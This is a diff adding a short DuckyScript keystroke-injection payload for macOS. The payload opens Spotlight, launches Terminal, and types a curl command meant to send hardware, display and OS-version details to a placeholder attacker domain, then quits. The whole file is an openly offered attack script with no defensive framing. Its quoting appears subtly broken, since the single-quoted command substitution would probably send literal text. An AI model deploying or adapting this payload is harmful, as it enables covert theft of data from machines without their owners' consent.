@@ -1,0 +1,11 @@
+REM Exfilterates system information to an attacker-controlled domain
+DELAY 2000
+GUI space
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING curl -s --data 'echo $(system_profiler SPHardwareDataType; system_profiler SPDisplaysDataType; sw_vers;)' '<attacker-domain>'
+ENTER
+ENTER
+GUI q
